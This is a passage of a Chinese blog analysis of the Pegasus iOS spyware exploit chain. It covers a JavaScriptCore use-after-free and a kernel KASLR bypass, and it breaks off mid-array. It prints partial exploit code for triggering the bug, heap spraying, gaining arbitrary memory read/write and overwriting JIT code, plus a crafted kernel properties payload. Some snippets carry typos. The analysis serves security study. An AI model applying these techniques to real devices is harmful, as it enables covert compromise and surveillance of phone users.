<p>这个方法可能调用用户自定义的JavaScript方法（使用已定义的属性）。这样，内存回收会被触发，导致未标记的堆备份重新分配。因此，对descriptor向量PropertyDescriptor存储的对象的引用要独立标记，确保不被回收。这里，使用了<strong>MarkedArgumentBuffer</strong>，临时存储变量值，防止被回收。</p>
<p>首先，来理解JavaScriptCore的垃圾回收机制，当对象不在被使用，或者WebContentjin进程占用更多内存的时候会回收内存。系统会遍历栈，确定对象是否被引用。堆中也可能引用对象，但只在特殊情况中。</p>
<p>MarkedArgumentBuffer维持一个<strong>inline</strong>栈表，由各个值组成。但进行垃圾回收时，每个值会被标记，其代表的对象就会避免回收释放。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MarkedArgumentBuffer</span> </span>&#123;</span><br><span class="line">	...</span><br><span class="line">	private:</span><br><span class="line">		<span class="keyword">static</span> <span class="keyword">const</span> size_t inlineCapacity=<span class="number">8</span>;</span><br><span class="line">	...</span><br><span class="line">	public:</span><br><span class="line">	...</span><br><span class="line">		MarkedArgumentBuffer()</span><br><span class="line">			:m_size(<span class="number">0</span>)</span><br><span class="line">			,m_capacity(inlineCapacity)</span><br><span class="line">			,m_buffer(m_inlineBuffer)</span><br><span class="line">			,m_markSet(<span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">		&#125;</span><br><span class="line">	...</span><br><span class="line">		<span class="keyword">void</span> <span class="function"><span class="title">append</span>(<span class="params">JSValue v</span>)</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(m_size &gt;= m_capacity)</span><br><span class="line">			<span class="keyword">return</span> slowAppend(v);</span><br><span class="line">		</span><br><span class="line">		slotFor(m_size)=JSValue::encode(v);</span><br><span class="line">		++m_size;</span><br><span class="line">	&#125;</span><br><span class="line">	...</span><br><span class="line">	private:</span><br><span class="line">	...</span><br><span class="line">		int m_size;</span><br><span class="line">		int m_capacity;</span><br><span class="line">		EncodedJSValue m_inlineBuffer[inlineCapacity];</span><br><span class="line">		EncodeedJSValue* m_buffer;</span><br><span class="line">		ListSet* m_markSet;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>inline栈只能存8个值。当向MarkedArgumentBuffer添加第九个值时，就移到堆中，能够存储的值也扩大了。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> MarkedArgumentBuffer::<span class="function"><span class="title">slowAppend</span>(<span class="params">JSValue v</span>)</span>&#123;</span><br><span class="line">	int newCapacity = m_capacity*<span class="number">4</span>;</span><br><span class="line">	EncodedJSValue* newBuffer = <span class="keyword">new</span> EncodeedJSValue[newCapacity];</span><br><span class="line">	<span class="keyword">for</span>(int i=<span class="number">0</span>;i&lt;m_capacity;++i)</span><br><span class="line">		newBuffer[i]=m_buffer[i];</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> (EncodedJSValue* base=mallocBase())</span><br><span class="line">		<span class="keyword">delete</span> [] base;</span><br><span class="line">	</span><br><span class="line">	m_buffer=newBuffer;</span><br><span class="line">	m_capacity=newCapacity;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>一旦移动到堆中，这些值就不再被垃圾回收机制保护。MarkedArgumentBuffer里的值会添加到堆中的<strong>m_markListSet</strong>并被标记，确保不会释放回收。当MarkedArgumentBuffer移到堆中时，也要移动<strong>markListSet</strong>中。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//As long as our size stays within our Vetor&#x27;s inline</span></span><br><span class="line"><span class="comment">//capacity, all our values are allocated on the stack, and </span></span><br><span class="line"><span class="comment">//therefore don&#x27;t need explicit marking. Once our size exceeds </span></span><br><span class="line"><span class="comment">//our Vector&#x27;s inline capacity, though, our values move to the </span></span><br><span class="line"><span class="comment">//heap, where they do need explicit marking.</span></span><br><span class="line"><span class="keyword">for</span> (int i=<span class="number">0</span>; i&lt;m_size;++i)&#123;</span><br><span class="line">	Heap* heap=Heap::heap(JSValue::decode(slotFor(i)));</span><br><span class="line">	<span class="keyword">if</span>(!heap)</span><br><span class="line">		<span class="keyword">continue</span>;</span><br><span class="line">	</span><br><span class="line">	m_markSet = &amp;heap-&gt;markListSet();</span><br><span class="line">	m_markSet-&gt;add(<span class="built_in">this</span>);</span><br><span class="line">	<span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面的代码请求了一个堆，把MarkedArgumentBuffer添加到堆中的markListSet。但只有第九个值加入MarkedArgumentBuffer才调用。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">inline Heap* Heap::<span class="function"><span class="title">heap</span>(<span class="params"><span class="keyword">const</span> JSValue v</span>)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!v.isCell())</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">return</span> heap(v.asCell());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>JSValue</strong>有一个tag，说明它编码的值的类型。在一个复杂的对象中，tag为CellTag，JSValue创建一指针指向堆中的值。对简单类型来说，变量可以直接解码成JSValue（例如整形，布尔型，null，还有未定义的），在堆中存储这样的值是多余的，还会创建一个tag。**JSValue::isCell() **函数决定是否在堆中创建指针指向单元格。因为简单类型不会指向堆，为这些类型指定堆没有意义，只会返回null。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">inline bool JSValue::isCell() <span class="keyword">const</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> !(u.asInt64&amp;TagMask);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>因此，如果要添加到MarkedArgumentBuffer的第九个值不是一个堆备份值，当请求堆时会返回NULL， MarkedArgumentBuffer也不会添加到堆markListSet中。MarkedArgumentBuffer就不在起作用，第九个值以后的值可以被释放回收。descriptor向量里的堆值，被引用后，可能会被污染。实际上，对这些值的另一个引用仍然存在（defineDescriptor()有JavaScript的变量）。在垃圾回收前，余下的JSValue的引用必须先移去，以使descriptor向量里的引用被污染。<br><a target="_blank" rel="noopener" href="https://imgchr.com/i/ESiMgf"><img src="https://s2.ax1x.com/2019/04/18/ESiMgf.png" alt="ESiMgf.png"></a><br>调用defineOwnDescriptor()一定会调用基于属性值的用户控制的方法。结果，最后一个对一属性值的引用可以被用户定义的JavaScript代码移去。如果垃圾回收在移去一特定值的所有引用和目标对象desceiptor向量里的值时被触发，这些释放了的空间会作为一个变量存储在目标对象上。</p>
<h4 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h4><p>Pegasus通过向defineProperties()函数传入一系列精心制作的变量来触发这个漏洞。当这些独立变量连续添加到MarkedArgumentBuffer，这个漏洞就会触发，如果垃圾回收在关键时候及时触发，JSArray会错误释放。因为垃圾回收不一定会被触发，所以重复攻击以触发错误释放和再分配（会尝试十次），还会测试是否一个被污染的引用已经成功获得。假设垃圾回收正确触发，那么另一个对象就会分配在污染的JSArray之上。接着，设置可以获得本地代码执行权的工具，即读写权限，获取任意JavaScript对象位置。一旦这些步骤都完成了，就会创建一个payload可执行代码集。</p>
<h5 id="设置触发漏洞"><a href="#设置触发漏洞" class="headerlink" title="设置触发漏洞"></a>设置触发漏洞</h5><p>攻击使用一个JSArray对象触发漏洞代码块，获得任意代码执行权。下面这段代码触发漏洞。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr=<span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">2047</span>);</span><br><span class="line"><span class="keyword">var</span> not_number=&#123;&#125;;</span><br><span class="line">not_number.toString=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	arr=<span class="literal">null</span>;</span><br><span class="line">	props[<span class="string">&quot;stale&quot;</span>][<span class="string">&#x27;value&#x27;</span>]=<span class="literal">null</span>;</span><br><span class="line">	...<span class="comment">//Trigger garbage collection and reallocation over stale object</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">10</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> props=&#123;</span><br><span class="line">	p0:&#123;<span class="attr">value</span>:<span class="number">0</span>&#125;,</span><br><span class="line">	p1:&#123;<span class="attr">value</span>:<span class="number">1</span>&#125;,</span><br><span class="line">	p2:&#123;<span class="attr">value</span>:<span class="number">2</span>&#125;,</span><br><span class="line">	p3:&#123;<span class="attr">value</span>:<span class="number">3</span>&#125;,</span><br><span class="line">	p4:&#123;<span class="attr">value</span>:<span class="number">4</span>&#125;,</span><br><span class="line">	p5:&#123;<span class="attr">value</span>:<span class="number">5</span>&#125;,</span><br><span class="line">	p6:&#123;<span class="attr">value</span>:<span class="number">6</span>&#125;,</span><br><span class="line">	p7:&#123;<span class="attr">value</span>:<span class="number">7</span>&#125;,</span><br><span class="line">	p8:&#123;<span class="attr">value</span>:<span class="number">8</span>&#125;,</span><br><span class="line">	length:&#123;<span class="attr">value</span>:not_number&#125;,</span><br><span class="line">	stale:&#123;<span class="attr">value</span>:arr&#125;,</span><br><span class="line">	after:&#123;<span class="attr">value</span>:<span class="number">666</span>&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> target=[];</span><br><span class="line"><span class="built_in">Object</span>.defineProperties(target,props);</span><br></pre></td></tr></table></figure>
<p>经过特别精心编排的props对象触发slowAppend()内的漏洞。当第九个属性值添加到MarkedArgumentBuffer(P8)，slowAppend()将无法获得堆地址（因为这个值是一个简单类型，即整形，并且原先堆上没有这个值）。那么，MarkedArgumentBuffer就不能保护堆备份值（not_number和arr），当垃圾回收时就会被释放。</p>
<p>当defineOwnDescriptor()接受这个长属性值，它会尝试将这个值（not_number）转变为一个数字。如下所示，toString()被调用，移去arr的后两项引用。一旦移去，JSArray将取消标记，下一次垃圾回收就会释放整个对象。Pegasus通过toString()方法申请分配内存空间，促使垃圾回收运行（释放arr对象）。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> attempts=<span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">4250000</span>);</span><br><span class="line"><span class="keyword">var</span> pressure=<span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">100</span>);</span><br><span class="line">...</span><br><span class="line">not_number.toString=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	...</span><br><span class="line">	<span class="function"><span class="title">for</span>(<span class="params"><span class="keyword">var</span> i=<span class="number">0</span>;i&lt;pressure.length;i++</span>)</span>&#123;</span><br><span class="line">		pressure[i]=<span class="keyword">new</span> Unit32Array(<span class="number">262144</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">var</span> buffer=<span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">80</span>);</span><br><span class="line">	<span class="keyword">var</span> unitArray=<span class="keyword">new</span> Unit32Array(buffer);</span><br><span class="line">	unitArray[<span class="number">0</span>]=<span class="number">0xAABBCCDD</span>;</span><br><span class="line">	<span class="function"><span class="title">for</span>(<span class="params">i =<span class="number">0</span>;i&lt;attempts.length;i++</span>)</span>&#123;</span><br><span class="line">		attempts[i]=<span class="keyword">new</span> Unit32Array(buffer);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>attempts每一项都在同一段缓冲区上分配4.25 million个Unit32Array。在arr对象使用的同一内存区再分配一系列的Unit32Array。</p>
<p>完成后，会检测垃圾回收是否触发。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> before_len=arr.length;</span><br><span class="line"><span class="built_in">Object</span>.defineProperties(target,props);</span><br><span class="line">stale=targets.stale;</span><br><span class="line"><span class="keyword">var</span> after_len=stale.length;</span><br><span class="line"><span class="function"><span class="title">if</span>(<span class="params">before_len==after_len</span>)</span>&#123;</span><br><span class="line">	<span class="keyword">throw</span> <span class="keyword">new</span> RecoverableException(<span class="number">8</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果JSArray的长度没有改变，要么垃圾回收没有触发，要么是Unit32Array没有在stale相同地址上分配空间。这种情况，攻击就失败了，但会再尝试。</p>
<h4 id="获取任意读写原语"><a href="#获取任意读写原语" class="headerlink" title="获取任意读写原语"></a>获取任意读写原语</h4><p>假设攻击已经成功了，那么在同一段的内存中有两个不同类型的对象。第一个是JSArray(已污染)，第二个是众多已分配的Unit32Arrays中的一个（实际上，默认类型是 JSGenericTypedArrayView）。通过对污染对象的读写，可以读取或破环JSGenericTypedArrayView的成员变量。特别地，在JSArray和JSGenericTypedArrayView长度重叠的地方，写入一个偏移量，就可以有效地设置Unit32Array的长度为0xFFFFFFFF。破环这个值，可以将这个array作为WebContent进程的全部虚拟地址空间（即任意读写原语）。</p>
<p>攻击需要确定已分配的众多Unit32Array中哪一个与污染对象匹配。可以一一测试，并检查长度是否被改为0xFFFFFFFF。所有其他数组仍将保留原始的备份ArrayBuffer。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">for</span>(<span class="params">x=attempts.length-<span class="number">1</span>;x&gt;=<span class="number">1</span>;x--</span>)</span>&#123;</span><br><span class="line">	<span class="function"><span class="title">if</span>(<span class="params">attempts[x].length != <span class="number">80</span>/<span class="number">4</span></span>)</span>&#123;</span><br><span class="line">		<span class="function"><span class="title">if</span>(<span class="params">attempts[x].length==<span class="number">0xFFFFFFFF</span></span>)</span>&#123;</span><br><span class="line">			memory_view=attempts[x];</span><br><span class="line">			...</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="获取对象地址"><a href="#获取对象地址" class="headerlink" title="获取对象地址"></a>获取对象地址</h4><p>完成攻击的最后组件需要能够获取任意JavaScript对象的地址。Pegasus用破坏Unit32Array的方法来获取地址。向对象写入一偏移值，Unit32Array的缓冲区就被破坏，并指向用户控制的JSArray。JSArray的第一个元素设置成需要爆破的JavaScript对象（通过损坏指向uint32数组的底层存储的指针），可以从Unit32Array中读取地址信息。</p>
<h4 id="本地代码执行"><a href="#本地代码执行" class="headerlink" title="本地代码执行"></a>本地代码执行</h4><p>Pegasus第一段段余下要做的是创建一个可执行代码集，这个集合包含了要被执行的恶意代码。创建一个JSFunction对象（包含上百个之后会被重写的try/catch块）完成这项工作。为确保JIT编译成本机代码，这个函数会被重复调用。这样，这个函数会被标记为会经常调用并不会释放的高优先级代码。因为JavaScriptCode编译器运行JSTed代码的独特方式，代码会存储在可以读写运行的内存区。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> body=<span class="string">&#x27; &#x27;</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> k=<span class="number">0</span>;k&lt;<span class="number">0x600</span>;k++)&#123;</span><br><span class="line">	body+=<span class="string">&#x27;try &#123;&#125; catch(e);&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> to_overwrite=<span class="keyword">new</span> <span class="built_in">Function</span>(<span class="string">&#x27;a&#x27;</span>,body);</span><br><span class="line"><span class="function"><span class="title">for</span>(<span class="params"><span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="number">0x1000</span>;i++</span>)</span>&#123;</span><br><span class="line">	to_overwrite();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以获得JSFunction对象的地址，并且通过读取不同的成员变量，可以获得RWX的映射。接着JSFed的try/catch块会被恶意代码替换。通过调用to_overwrite()函数，可以轻松取得任意代码执行权。</p>
<h4 id="回避检测"><a href="#回避检测" class="headerlink" title="回避检测"></a>回避检测</h4><p>当攻击失败，Pegasus有一个紧急拯救代码，很可能是创建内核崩溃转储而防止暴露这个漏洞。代码在一个空引用上触发崩溃。当分析师分析这样的情况会马上认为这个BUG为非法空指针引用而不会怀疑是恶意攻击。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>._proto_._proto_=<span class="literal">null</span>;</span><br><span class="line">x=<span class="keyword">new</span> <span class="built_in">String</span>(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">x._proto_._proto_._proto_=<span class="built_in">window</span>;</span><br><span class="line">x.Audio;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="绕过KASLR"><a href="#绕过KASLR" class="headerlink" title="绕过KASLR"></a>绕过KASLR</h2><h3 id="注入的第二阶段：内核位置泄露"><a href="#注入的第二阶段：内核位置泄露" class="headerlink" title="注入的第二阶段：内核位置泄露"></a>注入的第二阶段：内核位置泄露</h3><p>第二阶段依靠一个内核信息泄露漏洞（CVE-2016-4655），为接下来实现越狱的内核存储污染漏洞（CVE-2016-4656）做准备。</p>
<h3 id="分析KASLR绕过"><a href="#分析KASLR绕过" class="headerlink" title="分析KASLR绕过"></a>分析KASLR绕过</h3><p>阶段二进行提权，为iphone越狱做准备。Pegasus准备了两套方案。方案一为IOS内核爆破。方案二为找出已经越狱的iphone（已经安装了后门程序），利用已存在的后门来安装Pegasus的内核补丁包。</p>
<p>首先，必须确定内核在内存中的位置，提升自己的权限，解除保护机制，然后安装越狱软件。为了波及更多iphone，Pegasus准备了32位和64位的包。这两个包可以波及大约19个iPhone版本。阶段二的变种在设计上有许多的相似性，但各自的目的不同，所以最好相关又隔离地看待变种。接下来会讲解阶段二变体的每一个部分，并且会指出变种相似的地方。</p>
<h4 id="32位和63位二进制包不同的地方"><a href="#32位和63位二进制包不同的地方" class="headerlink" title="32位和63位二进制包不同的地方"></a>32位和63位二进制包不同的地方</h4><p>32位包应用于老款的iPhone（iPhone4s–iPhone5c），目标版本为IOS 9.0到IOS 9.3.3。64位应用于新款iPhone（iPhone5s–最新款），目标版本也是IOS 9.0到IOS 9.3.3。两个二进制包执行类似的步骤，利用相同的漏洞。但是，利用漏洞的方式因版本的不同而不同。在运行机制不同的地方，进行分别各自的处理。</p>
<h4 id="加载API"><a href="#加载API" class="headerlink" title="加载API"></a>加载API</h4><p>想要阶段二成功，需要获得大量的API函数。为保证函数可用，阶段二通过<strong>dlsym</strong>动态加载需要的API地址。虽然动态读取API地址在恶意软件上很常见，但有趣的是制作者多次重复加载许多的API函数。仅在<strong>main</strong>函数上，加载了大量的API地址，但只使用一小部分的API（例如，<strong>socket</strong>函数加载到了内存中，却一直没有使用）。在加载了初期的API函数后，32位包调用了一个子进程（初始化），这个进程又会轮流调用其他几个子进程，每个进程负责加载其他的API函数，除此之外，执行不同的启动项任务。</p>
<p>分类加载API函数（哪个阶段二函数会加载哪个API函数），还有重复加载大量API，表明加载API是一些独立组件或者操作独有的。例如，一些函数负责解压越狱文件，利用<strong>chmod</strong>改变权限，将文件放在受害者iPhone上正确的地方。一个独立函数会加载执行这些操作的API函数。这个函数只会加载那些有用的API，而这些API不会和阶段二其他部分共享。</p>
<p>由于在整个二进制文件中大量使用调试日志，阶段二的分析也变得更加容易。对日志记录子系统的调用通常引用漏洞开发人员使用的原始文件名。这些调试代码的出现至少表明有以下独立模块（或子系统）存在：</p>
<ol>
<li><strong>fs.c</strong> 加载跟文件还有文件系统操作方法例如<em>ftw,open,read,rename,mount</em>有关的API</li>
<li><strong>kaslr.c</strong> 加载API，如<em>IORegistryEntryGetChildIterator,IORegistryEntryGetProperty,IOServiceGetMatchingService</em>，通过利用<em>io _ service _ open _ extended</em>函数中的漏洞，这些API来找到内核地址。</li>
<li>**bh.c ** 加载与下个阶段payloads相关的API，以及与放置文件正确位置相关的API，如 <em>BZ2 _ bzDecompress, chmod, and malloc</em></li>
<li>*<em>safari.c ** 加载如</em>sync, exit, strcpy*API，这些API用来清除Safari缓存文件以及终止进程。当攻击完成且完全退出后，这些清除工作才会开始，所以Safari崩溃清除（阶段一中说明的）就不会发生。</li>
</ol>
<p>上述部分说明阶段二是基于模块化理念设计的，至少，由不同代码源文件组成。这些不同成分很可能在iOS攻击链中可重复使用。</p>
<h4 id="环境设置和平台确定"><a href="#环境设置和平台确定" class="headerlink" title="环境设置和平台确定"></a>环境设置和平台确定</h4><p>在初始化完成后，阶段二调用了一个全局回调函数，因错误阶段二终止时就会调用这个函数。根据写入器中的文件名，这个函数可能是一个断言样式回调。</p>
<p>为了确定受害者设备的型号，调用了<em>sysctlbyname</em>获得<em>hw.machine</em>。另一个对<em>sysctlbyname</em>获取*kern.osversion *信息。完成这两项后，阶段二可以精确确定型号和iOS 内核版本。根据这两个信息，找到定义不同内存偏移量的数据库，阶段二依据这个库来爆破设备。如果阶段二找不到适合设备的数据库，进程会执行这个断言回调并退出。</p>
<p>阶段二在运行时使用一个锁定文件。作为运行环境设置的一部分，阶段二为这个文件创建文件名和全局目录变量–<em>$HOME/tmp/lock</em>（注意：*$HOME*是一个程序独有变量）</p>
<p>32位包支持100个手机型号和iOS版本组合项。同样，64位包支持99个手机型号和iOS版本组合项。</p>
<h4 id="攻入KASLR"><a href="#攻入KASLR" class="headerlink" title="攻入KASLR"></a>攻入KASLR</h4><p>阶段二的大部分功能是用来操纵内核以使受害设备防御系统失效。想要控制内核，必须先知道内核的位置。因为iOS使用的KASLR机制，通常情况下内核会映射到一随机地址。KASLR在用户每一次开机后将内核映射到一伪随机地址来阻止进程定位内存中内核地址。要找到内核，阶段二必须找到办法将内核空间的一个地址暴露到用户内存空间中。阶段二利用<strong>CVE-2016-4655</strong>找到内核空间中的一个内存地址。</p>
<p>阶段二首先在IOKit 子系统上开放了一个端口来找到内核。如果失败，调用断言回调并退出。阶段二创建了一个叫<strong>AppleKeyStore</strong>的服务并调用<strong>IOServiceMatching</strong>，调用结果返回到<strong>IOServiceGetMatchingService **，得到</strong>io _ service _ t<strong>对象，这个对象包含攻击者想要的已注册的IOKit IOService（即 AppleKeyStore）。有了这个IOService句柄，阶段二调用</strong>io_service_open_extended<strong>并将一段精心制作的属性字段传到服务中。这个字段是</strong>XML<strong>数据的串行化二进制表示，</strong>io_service_open_extended<strong>会将数据最终传到内核中的</strong>OSUnserializeBinary<strong>函数。</strong>OSUnserializeBinary<strong>里是一个转化语句，处理二进制XML数据结构中的不同种类的数据。</strong>kOSSerializeNumber**类型的数据会随便接受一定长度的数据而没有任何的数据边界审核，最终会使调用者获得比允许的更多的内存空间。因为下面这段代码，这种情况得以发生。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">len=(key &amp; kOSSerializeDataMask);</span><br><span class="line">...</span><br><span class="line"><span class="keyword">case</span> kOSSerializeNumber:</span><br><span class="line">												bufferPos += <span class="keyword">sizeof</span>(<span class="keyword">long</span> <span class="keyword">long</span>);</span><br><span class="line">												<span class="keyword">if</span>(bufferPos&gt;bufferSize) <span class="keyword">break</span>;</span><br><span class="line">												value=next[<span class="number">1</span>];</span><br><span class="line">												value&lt;&lt;=<span class="number">32</span>;</span><br><span class="line">												value |= next[<span class="number">0</span>];</span><br><span class="line">												o = OSNumber::withNumber(value. len);</span><br><span class="line">												next+=<span class="number">2</span>;</span><br><span class="line">													<span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
<p>问题是<strong>len</strong>变量在传送到<strong>OSNumber::withNumber</strong>前是无效的。最终，<strong>OSNumber::init</strong>被调用，其会盲目信任用户控制的值。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">OSNumber::init</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> inValue, <span class="keyword">unsigned</span> <span class="keyword">int</span> newNumberofBits )</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (!super::init())</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	size=newNumberOfBits;</span><br><span class="line">	value=(inValue &amp; sizeMask);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个漏洞让阶段二可以控制OSNumber的大小。<strong>io_service_open_extended</strong>为<strong>OSUnserializedBinary</strong>准备好了使用环境，通过<strong>OSUnserializedBinary</strong>来利用漏洞。在怎么利用前，先来看看传送到<strong>io_service_open_extended</strong>的恶意**properties **字段。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> properties[]=&#123;</span><br><span class="line">	<span class="comment">//kOSSerializeBinarySignature</span></span><br><span class="line">	<span class="number">0xD3</span>, <span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line">	<span class="comment">//kOSSerializeEndCollecton | kOSSerializeDictionary | 2</span></span><br><span class="line">	<span class="number">0x02</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x81</span>,</span><br><span class="line">	<span class="comment">//KEY 1 specified as 30 bytes long (0x1E)</span></span><br><span class="line">	<span class="comment">//kOSSerializeSymbol | 0x1E</span></span><br><span class="line">	<span class="number">0x1E</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x08</span>,</span><br><span class="line">	<span class="string">&quot;HIDKeyboardModifierMappingSrc&quot;</span>, <span class="number">0x00</span>,    <span class="comment">//(30 bytes)</span></span><br><span class="line">	<span 